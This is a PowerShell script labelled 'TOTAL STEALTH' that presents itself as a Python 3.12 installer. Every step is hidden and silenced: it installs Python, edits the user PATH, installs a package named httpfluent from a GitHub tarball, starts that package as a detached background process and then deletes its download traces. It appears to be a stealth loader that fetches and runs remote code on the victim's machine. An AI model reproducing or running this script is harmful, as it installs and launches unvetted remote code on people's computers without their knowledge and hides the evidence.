# ===================================================
# Python 3.12.6 + httpfluent
# TOTAL STEALTH - WITH EXECUTION STABILIZATION
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true

# --- Step 0: Silent Pre-Check ---
if (Get-Command python -ErrorAction SilentlyContinue) {
    $ExecutableToUse = "python"
} elseif (Test-Path $PythonExe) {
    $ExecutableToUse = $PythonExe
}

if ($ExecutableToUse) {
    $VersionString = & $ExecutableToUse --version 2>&1
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        if ([version]$Matches[1] -ge [version]"3.9") {
            $InstallRequired = $false
        }
    }
}

# --- YOUR ALGORITHM (All output to $null) ---
if ($InstallRequired) {
    $PythonVersion = "3.12.6"
    $PythonInstaller = "python-$PythonVersion-amd64.exe"
    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$PythonInstaller"
    $DownloadDir = "$env:TEMP\Python"

    if (-not (Test-Path $DownloadDir)) {
        New-Item -ItemType Directory -Path $DownloadDir > $null 2>&1
    }

    $InstallerPath = Join-Path $DownloadDir $PythonInstaller
    try {
        (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $InstallerPath)
    } catch { exit 1 }

    # Step 4: Install Python
    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null 2>&1

    # Step 5: Fix USER PATH
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $OldPath = $OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),""
    $NewPath = "$InstallDir;$InstallDir\Scripts;$OldPath"
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null 2>&1
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
}

# --- Step 7: Installation & Execution ---

# 1. Update Pip (Silent)
& $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1

# 2. Install Requests
& $ExecutableToUse -m pip install requests --quiet > $null 2>&1

# 3. Install httpfluent
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1

# 4. EXECUTION FIX: Launch and Wait for Initialization
# Start the process in background
Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" 

# CRITICAL: Wait 10 seconds to allow the process to initialize 
# and "detach" from the current script session.
Start-Sleep -Seconds 10

# --- Step 8: Cleanup ---
if (Test-Path $DownloadDir) {
    Remove-Item $DownloadDir -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
}
